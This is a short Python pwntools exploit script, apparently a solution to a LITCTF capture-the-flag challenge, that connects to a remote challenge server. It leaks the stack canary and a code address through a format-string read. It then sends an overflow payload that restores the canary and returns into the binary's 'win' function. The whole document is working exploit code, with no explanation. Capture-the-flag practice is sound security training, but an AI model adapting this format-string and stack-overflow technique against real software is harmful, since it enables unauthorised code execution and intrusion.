from pwn import *

context.binary = exe = ELF('./s')

#io=process()
#gdb.attach(io, api=True)
io = remote('litctf.org', 31791)

io.sendline(b'%11$p %13$p')
io.recvuntil(b'0x')
canary = int(io.recvuntil(b' '), 16)
io.recvuntil(b'0x')
exe.address = int(io.recv(timeout=0.5), 16) - (exe.sym['main']+58)
payload = b'i'*40 + p64(canary) + p64(0) + p64(exe.sym['win']+5)
io.sendline(payload)
io.interactive()